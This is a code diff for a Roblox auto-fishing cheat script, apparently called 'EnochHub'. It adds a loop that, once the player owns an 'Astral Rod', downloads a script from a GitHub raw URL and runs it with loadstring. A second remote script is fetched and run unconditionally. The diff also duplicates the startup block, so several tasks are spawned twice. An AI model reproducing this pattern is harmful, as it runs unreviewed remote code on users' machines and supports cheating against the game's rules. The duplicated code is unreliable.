@@ -575,5 +575,25 @@ task.spawn(CreateDashboard)
 task.wait(2)
 RF_UpdateAutoFishingState:InvokeServer(true)
 print("🚀 EnochHub Full Auto (v1.3.1) Started!")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/aeb"))()
+-- ===============================
+-- EXECUTE
+-- ===============================
+task.spawn(EnablePotatoMode)
+task.spawn(CreateDashboard)
+task.wait(2)
+RF_UpdateAutoFishingState:InvokeServer(true)
+print("🚀 EnochHub Full Auto (v1.3.1) Started!")
+
+-- Load the first script immediately (if you want it always)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/list/refs/heads/main/game"))()
+
+-- Check for Astral Rod and load the second script only if player has it
+task.spawn(function()
+    while task.wait(5) do  -- Check every 5 seconds
+        if STATE.HasAstralRod then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/aeb"))()
+            print("✓ External script loaded (Astral Rod detected)")
+            break  -- Stop checking once loaded
+        end
+    end
+end)
